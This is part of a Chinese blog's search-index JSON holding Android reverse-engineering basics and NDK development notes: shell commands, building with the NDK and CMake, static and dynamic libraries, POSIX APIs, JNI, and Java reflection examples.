","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:3","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看文本文件内容 cat Luo.txt ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:4","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"在shell中过滤符合条件的输出 cat Luo.txt | grep LuoHun ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:5","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看当前设备正在运行的进程 //在Android8之后,ps命令只能打印出当前进程,需要加上-e参数才能打印出全部的进程 ps ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:6","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看App网络相关信息 通常使用的参数组合为-alpe netstat -alpe用于查看sockets连接的IP和端口以及相应的进程名和PID,配合grep往往有奇效. netstat -alpe | grep com.android.la ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:7","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看对应进程打开的文件 lsof -p 1625 -l | grep jar 这里的文件不仅仅指常见的普通文件.在Linux系统中有一种说法叫\"万物皆文件”,其实网络中建立连接的也可以叫做文件,因此lsof命令也可以用于与netstat命令相同的操作. lsof -l -p 1625 | grep TCP ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:8","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看当前系统运行负载 //和htop作用一样,只是相对来说htop更加人性化 top ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:9","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"概述 全称:Native Development Kit,可让您使用C和C++等语言以原生代码实现应用的各个部分. https://developer.android.google.cn/ndk 文件类型: .o 等同于.Obj .a 等同于.lib .so等同于.dll ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:1:0","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"编译器 目前主要是clang编译器,Gcc编译器已被移除. 下载NDK,里面有Clang编译器. 编译示例: 将Clang编译器所在目录加入到环境变量path中,这个目录中有很多做好的cmd文件(如:i686-linux-android16-clang.cmd). 假如说编译Hello.c 编译 i686-linux-android16-clang -c -o Hello.o Hello.c 链接 i686-linux-android16-clang -o Hello Hello.o 生成的Hello文件格式为Elf. 将生成的文件传到手机上运行 //传文件到手机上 adb push Hello /data/local/tmp //进入shell,修改/data/local/tmp/Hello路径权限为可执行 adb shell chmod a+x /data/local/tmp/Hello //运行程序 /data/local/tmp/Hello 注意 若要在手机上运行Hello这个程序,需要使用shell命令.若手机有Root权限,该Hello文件执行时也会有Root权限,但是apk文件不会具有Root权限,它只能得到一个带root权限的shell. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:2:0","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"通用编译脚本 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:3:0","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Makefile 假如说10个人开发一个软件,用VS是不行的. Android NDK工具包中有makefile解释器. 效率: 当生成的某个obj文件没有发生变化时,不重新生成,提高编译效率,可通过判断obj生成时间和.c文件的生成时间,若前者大于后者,则说明不需要重新生成,否则就需要重新生成obj文件. 语法参考: https://github.com/seisman/how-to-write-makefile Makefile语法参考.pdf ndk-build脚本: 手工编译示例: 将ndk-build.cmd所在的路径添加到系统环境变量中. 将要编译的文件放到一个名为jni或cpp的文件夹中. 新建一个Android.mk文件. 新建一个Application.mk文件. 编译. ndk-build 编译清理. ndk-build clean ndk-build手工编译.7z 利用AndroidStudio来编译: AS新建一个空工程. 将上面的jni或cpp文件夹拷贝到新建的工程中. 在AS中选择Link C++ Project. 这个地方的右键,其实是在编译脚本中加了一段话. 指明NDK路径,下载了NDK,默认即可. 指定编译的平台. Ctrl + F9 编译工程即可. ndk-build_AS编译.7z 注意 用ndk-build编译C++程序需注意,Cmake编译无需注意. 需要设置STL C++异常 Rtti的开关. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:3:1","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Cmake编译(Android主推) 新建一个工程,这个工程默认就是CMake编译. 将要编译的文件,放到工程的cpp目录中. 添加编译链接内容. 指定编译的平台. Ctrl + F9编译工程即可. Cmake编译.7z ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:3:2","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"静态库 又称归档文件,当一个工程链接静态库时,只会链接需要的Obj. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:4:0","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"编译 手工编译 编译静态库的程序为llvm-ar.exe. //mou1.h #include \u003cstdio.h\u003e void mou1(); //mou1.c #include \"mou1.h\" void mou1(){ printf(\"Hello mou1\\n\"); } //main.c #include \"mou1.h\" int main(){ mou1(); printf(\"Hello Main\\n\"); } //Makefile NDK_PATH := D:/AndroidSDK/ndk/21.4.7075529/toolchains/llvm/prebuilt/windows-x86_64/bin BUILD_ABI := i686 BUILD_PLT_VERSION := android21 BUILD_CLANG := $(BUILD_ABI)-linux-$(BUILD_PLT_VERSION)-clang BUILD_AR := $(BUILD_ABI)-linux-android-ar BUILD_MODULE_NAME := main BUILD_LIB_NAME := libmou.a BUILD_FLAGS := -c BUILD_LINKER_FLAGS := -o $(BUILD_MODULE_NAME) main.o mou1.o all: $(BUILD_CLANG) $(BUILD_FLAGS) main.c mou1.c $(BUILD_CLANG) $(BUILD_LINKER_FLAGS) lib: $(BUILD_AR) r $(BUILD_LIB_NAME) mou1.o install: adb push $(BUILD_MODULE_NAME) /data/local/tmp adb shell chmod a+x /data/local/tmp/$(BUILD_MODULE_NAME) adb shell /data/local/tmp/$(BUILD_MODULE_NAME) clean: del *.o $(BUILD_MODULE_NAME) $(BUILD_LIB_NAME) 静态库手工编译.rar ndk-build 可以放到AS中进行编译. 将要编译的源文件放到jni文件夹中. 新建一个Android.mk文件. #编译静态库 LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) #存储要构建的模块的名称 LOCAL_MODULE := mou #列举源文件 LOCAL_SRC_FILES := mou1.c mou2.c #包含编译脚本 include $(BUILD_STATIC_LIBRARY) #使用静态库 include $(CLEAR_VARS) LOCAL_MODULE := main LOCAL_SRC_FILES := main.c LOCAL_STATIC_LIBRARIES := mou include $(BUILD_EXECUTABLE) 新建一个Application.mk文件. APP_PLATFORM := android-16 APP_ABI := x86_64 cmd运行ndk-build进行编译. 静态库ndk-build.7z Cmake编译 假设编译的为Cpp文件,需要注意头文件加 extern “C”. 新建一个工程. 在cpp文件夹新建源文件. 指明要静态编译的文件. 修改编译脚本. 直接编译即可. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:4:1","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Cmake使用第三方静态库 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:4:2","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"优点 软件静态链接静态库的时候,只链接需要的代码. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:4:3","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"缺点 某一个.o文件有Bug,其他已经链接了该静态库的软件需要重新编译链接,维护性差. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:4:4","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"动态库 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:0","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"编译 手工编译 //Makefile NDK_PATH := D:/AndroidSDK/ndk/21.4.7075529/toolchains/llvm/prebuilt/windows-x86_64/bin BUILD_ABI := i686 BUILD_PLT_VERSION := android21 BUILD_CLANG := $(BUILD_ABI)-linux-$(BUILD_PLT_VERSION)-clang BUILD_AR := $(BUILD_ABI)-linux-android-ar BUILD_MODULE_NAME := main BUILD_LIB_NAME := libmou.so BUILD_FLAGS := -c BUILD_LINKER_FLAGS := -o $(BUILD_MODULE_NAME) main.o $(BUILD_LIB_NAME) all: $(BUILD_CLANG) $(BUILD_FLAGS) main.c $(BUILD_CLANG) $(BUILD_LINKER_FLAGS) lib: $(BUILD_CLANG) -c mou1.c mou2.c $(BUILD_CLANG) -o $(BUILD_LIB_NAME) -fpic -shared mou1.o mou2.o install: adb push $(BUILD_LIB_NAME) /data/local/tmp adb push $(BUILD_MODULE_NAME) /data/local/tmp adb shell chmod a+x /data/local/tmp/$(BUILD_MODULE_NAME) adb shell /data/local/tmp/$(BUILD_MODULE_NAME) clean: del *.o $(BUILD_MODULE_NAME) $(BUILD_LIB_NAME) -fpic 位置无关代码. #编译动态库 make lib #编译可执行文件 make #安装可执行文件到Android中并运行 make install 动态库手工编译.7z 报错处理: 需了解Linux共享库搜索规则. 共享库搜索路径: system/lib user/lib 环境变量,如果以apk运行,会将/data/data/packageName/lib设为环境变量 示例: //查看环境变量 echo $LD_LIBRARY_PATH //设置临时环境变量, 以:分割环境变量路径 export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/data/local/tmp ndk-build cmd 输入ndk-build即可编译. 动态库NDK-BUILD.7z Cmake编译 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:1","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"优点 某一个.so文件有Bug,只需重新编译该so文件即可. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:2","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"缺点 启动速度慢,但可以延迟加载. 软件加载动态库的时候,Dll中的函数代码全部进内存. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:3","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"查看导出函数 命令行 llvm-readelf -s so文件路径 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:4","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"函数不导出 //在Linux中 函数默认是导出的,若不导出需加前缀 __attribute__ ((visibility(\"hidden\"))) ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:5","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"初始化函数 不常用: 之所以说不常用,是因为不方便,每加一个功能都有可能会修改_init中的代码. 常用: 方便,名字随意只要声明为构造或析构函数即可,数量不限. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:6","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"动态使用 相关函数: void* dlopen(const char* __filename, int __flag); void* dlsym(void* __handle, const char* __symbol); int dladdr(const void* __addr, Dl_info* __info); int dlclose(void* __handle); 示例: 动态库使用.7z ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:5:7","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Android API 基于Linux内核,遵循Posix标准,也有自己独有的API. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:6:0","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"NDK 这是独有的API. 常用来打日志: #include \u003candroid/log.h\u003e #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, \"LuoHun\", __VA_ARGS__); #define LOGW(...) __android_log_print(ANDROID_LOG_WARN, \"LuoHun\", __VA_ARGS__); #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, \"LuoHun\", __VA_ARGS__); 添加库: ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:6:1","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Posix 可移植操作系统接口(Portable Operating System Interface),无窗口API. Cygwin,该库在Win32系统下实现了POSIX系统调用的API. errno 扩展了 C标准的errno,下面是C标准的errno. 通过查文档可知该函数出错时,errno是否被设置. 文件 相关函数: //打开 int open(const char *pathname, int flags, mode_t mode); //关闭 int close(int __fd); //读 ssize_t read(int fd, void *buf, size_t count); //写 ssize_t write(int fd, const void *buf, size_t count); //移动文件指针 off_t lseek(int fildes, off_t offset, int whence); //文件控制 int fcntl(int __fd, int __cmd, ...); //指定位置读写 ssize_t pread(int fildes, void *buf, size_t nbyte, off_t offset); ssize_t pwrite(int fd, const void *buf, size_t count, off_t offset); //文件属性 int stat(const char* __path, struct stat* __buf); //检查文件权限 int access(const char* __path, int __mode); //更改文件权限 int chmod(const char* __path, mode_t __mode); int fchmod(int __fd, mode_t __mode); //创建目录 int mkdir(const char* __path, mode_t __mode); //遍历文件 DIR* opendir(const char* __path); 文件控制: fcntl的用途之一是针对一个打开的文件,获取或修改访问模式和状态标识. 要获取这些设置,应将fcntl的cmd参数设置为F_GETFL. //下述到吗可以测试文件是否以同步写方式打开 int nFlags; nFlags = fcntl(fd, F_GETFL); if(nFlags \u0026 O_SYNC){ //... } 文件属性: 利用系统调用stat(),lstat(),fstat(),可以获取文件相关的信息. //返回文件的相关信息 int stat(const char* __path, struct stat* __buf); //与stat类似,区别,如果文件属于符号链接,那么返回的信息针对是的符号链接自身 int lstat(const char* __path, struct stat* __buf); //根据文件描述符获取文件的相关信息 int fstat(int __fd, struct stat* __buf); /* 系统调用stat()和lstat()无需对其所操作的文件本身拥有任何的权限,但是针对指定的pathname的父目录要有执行(搜素)权限.而fstat()系统调用只要文件描述符有效,总是成功. */ st_mode: 示例: struct stat statBuf; stat(\"/data/local/tmp/2.txt\", \u0026statBuf); printf(\"st_uid = %d st_gid = %d st_size = %lld, st_mode = %o\\n\", statBuf.st_uid, statBuf.st_gid, statBuf.st_size, statBuf.st_mode); if (S_ISREG(statBuf.st_mode)) { printf(\"常规文件\\n\"); } if (statBuf.st_mode \u0026 S_IRUSR) { printf(\"拥有读权限\\n\"); } 目录权限: 目录与文件拥有相同的权限方案,只是对3种权限的含义另有所指. 读权限:可列出目录之下的内容. 写权限:可在目录创建,删除文件. 可执行权限:可访问目录中的文件(搜索权限). 权限检查算法: 对于特权级进程,授予所有访问权限. 若进程的有效用户ID与文件的用户ID相同,内核会根据文件的属主权限,授予进程相应的访问权限. 若进程的有效组ID与文件的组ID相匹配,内核会根据文件的属组权限,授予进程相应的访问权限. 若以上3点都不满足,内核会根据文件的其他权限,授予进程相应的访问权限. 示例: #include \u003cjni.h\u003e #include \u003cstring\u003e #include \u003cstdio.h\u003e #include \u003csys/types.h\u003e #include \u003csys/stat.h\u003e #include \u003cfcntl.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003candroid/log.h\u003e #include \u003cerrno.h\u003e #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, \"Luo\", __VA_ARGS__); #define LOGW(...) __android_log_print(ANDROID_LOG_WARN, \"Luo\", __VA_ARGS__); #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, \"Luo\", __VA_ARGS__); int main() { /* FILE* fp = fopen(\"/data/local/tmp/1.txt\", \"r\"); if (fp == NULL){ //当C库函数出错了,会将错误传给全局变量errno printf(\"fopen error %d\\n\", errno); //将错误转换为字符串 perror(\"fopen\"); //传errno,将错误字符串返回,方便界面显示 char* pErr = strerror(errno); printf(\"%s\\n\", pErr); }*/ int fd = open(\"/data/local/tmp/2.txt\", O_RDWR | O_CREAT, S_IRWXU); if (fd \u003c 0) { perror(\"open\"); } int bytes = write(fd, \"Hello\", 5); if (bytes \u003c 0) { perror(\"write\"); } else { printf(\"write bytes: %d\\n\", bytes); } if (lseek(fd, 0, SEEK_SET) \u003c 0) { close(fd); perror(\"lseek\"); return 0; } char szBuf[0x100] = {}; ssize_t readBytes = read(fd, szBuf, sizeof szBuf); if (readBytes \u003c 0) { close(fd); perror(\"read\"); return 0; } printf(\"szBuf = %s readBytes = %d\\n\", szBuf, readBytes); //获取文件属性 struct stat statBuf; stat(\"/data/local/tmp/2.txt\", \u0026statBuf); printf(\"st_uid = %d st_gid = %d st_size = %lld, st_mode = %o\\n\", statBuf.st_uid, statBuf.st_gid, statBuf.st_size, statBuf.st_mode); if (S_ISREG(statBuf.st_mode)) { printf(\"常规文件\\n\"); } if (statBuf.st_mode \u0026 S_IRUSR) { printf(\"拥有读权限\\n\"); } //修改文件权限 相同Uid才可以修改权限 Root用户除外 fchmod(fd, S_IRWXU); //检查文件权限 if (!access(\"/data/local/tmp/2.txt\", W_OK)){ printf(\"拥有写权限\\n\"); } close(fd); return 0; } 线程 两种状态: 连接状态,pthread_join,会阻塞,等待线程结束拿线程返回值. 分离状态,pthread_detach,不会阻塞,节省内存开销. 终止线程: void pthread_exit(void *value_ptr); return /* 当一个线程设置了一个取消点,可使用下述API结束那个线程, 那个线程运行到取消点时,会结束线程 但遗憾的是,Android不允许使用此API */ int pthread_cancel(pthread_t thread); 线程同步: 互斥体: //初始化 //可以使用全局变量初始化 pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER; //也可以使用API初始化 int pthread_mutex_init(pthrea","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:6:2","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"混合编程JNI ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:7:0","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"概述 Java Native Interface Java =\u003e JNI =\u003exxx(动态库 so) xxx(动态库 so) =\u003e JNI =\u003eJava 两边互调应满足以下条件: so文件应该导出函数,在函数前加JNIEXPORT. 类型匹配,Java要调C++,首先类型应该匹配,在Jni.h中已定义好. 调用约定,在函数前加JNICALL. 如果是C++,防止名称粉碎,在函数前加extern “C” 名称规范问题: 为了防止误调so中的导出函数,应以包名_类名_函数名来命名 可以使用javah.exe将编译好的class文件给这个exe, 它会扫描类声明,看到native会自动创建头文件 不过这样还是很麻烦的,AndroidStodio已集成该工具 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:7:1","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Java调C++ 在Java类中添加声明, 声明前加native关键字. Alt + Enter,创建Jni方法. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:7:2","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Java反射 //拿目标对象 //① // Class cls = MainActivity.class; //② 本身有对象 //Class cls = this.getClass(); //③ 常用, 通过类名拿 try { Class cls = Class.forName(\"org.example.luojni.MainActivity\"); //new 对象 //不带构造new对象 Object obj = cls.newInstance(); //带构造new对象 Constructor constructor = cls.getConstructor(); //传构造参数即可 obj = constructor.newInstance(10); //调方法 传参数是为了防止有歧义,因为函数可以重载 //①拿方法 Method method = cls.getMethod(\"MyAdd\", int.class, int.class); //②拿方法 修改方法的访问权限 当方法为private时 第①种方式会拿不到 method = cls.getDeclaredMethod(\"MyAdd\", int.class, int.class); //修改方法的访问权限 method.setAccessible(true); //为了统一 返回值为Object //如果为静态方法 第一个参数给null就可以了 Object ret = method.invoke(obj, 1, 2); //若返回值为整型 就转为整型的包装类 int nResult = ((Integer) ret).intValue(); //反射字段 //①拿字段 Field field = cls.getField(\"mData\"); //②拿字段 修改字段的访问权限 当字段为private时 第①种方式会拿不到 field = cls.getDeclaredField(\"mData\"); //修改字段的访问权限 field.setAccessible(true); //修改字段值 field.setInt(obj, 1); //获取字段值 nResult = field.getInt(obj); } catch (ClassNotFoundException | NoSuchMethodException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } catch (NoSuchFieldException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } Java反射的强大之处在于可以修改方法和字段的访问权限. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:7:3","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"C++调Java C++操作Java中的字符串以及数组: Java中声明函数,以及使用. C++中操作. extern \"C\" JNIEXPORT jstring JNICALL Java_org_example_luojni_MainActivity_fun1(JNIEnv *env, jobject thiz, jstring str, jbyteArray ary) { //操作Java中的字符串 int nLen = env-\u003eGetStringLength(str); //传false 说明不拷贝缓冲区,跟Java中用的是同一个缓冲区 jboolean flag = false; const char* psz = env-\u003eGetStringUTFChars(str, \u0026flag); LOGD(\"len = %d str = %s\\n\", nLen, psz); //操作Java中的数组 int nCount = env-\u003eGetArrayLength(ary); jbyte * p = env-\u003eGetByteArrayElements(ary, \u0026flag); for (int i = 0; i \u003c nCount; ++i) { LOGD(\"%d \", p[i]); } //返回String return env-\u003eNewStringUTF(\"Hello Ret\"); } C++反射调Java: 写一个Java类. 在Java中声明native方法并调用. 在C++中反射调Java. //参数信息描述 //I(int) F(float) D(double) J(long) Z(bool) C(char) S(short) Ljava/lang/String(String) //一维数组 [i(int[]) //二维数组 [[i(int[][]) extern \"C\" JNIEXPORT void JNICALL Java_org_example_luojni_MainActivity_fun2(JNIEnv *env, jobject thiz) { //反射 //拿Java类 jclass cls = env-\u003eFindClass(\"org/example/luojni/MyClass\"); //new对象 //传\"\u003cinit\u003e\" 就是拿构造 jmethodID construct = env-\u003eGetMethodID(cls, \"\u003cinit\u003e\", \"()V\"); //构造若是有参数就传参, 这个函数是不定参的 jobject obj = env-\u003eNewObject(cls, construct); //调方法 //非静态方法 //()V 括号内写参数 后面写返回值 jmethodID fun1 = env-\u003eGetMethodID(cls, \"fun1\", \"()V\"); env-\u003eCallVoidMethod(obj, fun1); //静态方法 jmethodID fun2 = env-\u003eGetStaticMethodID(cls, \"fun2\", \"()V\"); env-\u003eCallStaticVoidMethod(cls, fun2); //示例 jmethodID Add = env-\u003eGetMethodID(cls, \"Add\", \"(II)I\"); //检查Java中的异常 if (env-\u003eExceptionCheck()){ //打印异常栈信息 env-\u003eExceptionDescribe(); //清除异常信息 为了不让程序崩 env-\u003eExceptionClear(); return; } jint nRet = env-\u003eCallIntMethod(obj, Add, 1, 6); //修改字段 jfieldID mData = env-\u003eGetFieldID(cls, \"mData\", \"I\"); env-\u003eSetIntField(obj, mData, 200); //引用计数 我们在C++中New了一个对象 Java虚拟机如何知道何时释放对象 //释放字符串或数组对象 可以调env-\u003eRelease... env-\u003eDeleteLocalRef(obj); } 加密: Java的逆向相对于C来说比较容易,将Java中的所有代码都用C反射来调用,然后对C++层进行加密. 注意 在C++中反射调Java无视权限(public private). 